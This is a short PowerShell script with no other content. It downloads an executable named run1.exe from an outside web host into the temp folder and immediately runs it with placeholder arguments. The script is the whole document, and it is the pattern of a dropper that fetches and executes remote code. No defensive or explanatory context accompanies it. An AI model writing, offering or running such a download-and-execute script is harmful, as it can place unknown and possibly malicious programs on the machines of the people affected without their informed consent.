Invoke-WebRequest -Uri 'http://dr.unaux.com/run1.exe' -OutFile $env:temp\run1.exe
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:temp/run1.exe" -ArgumentList $args
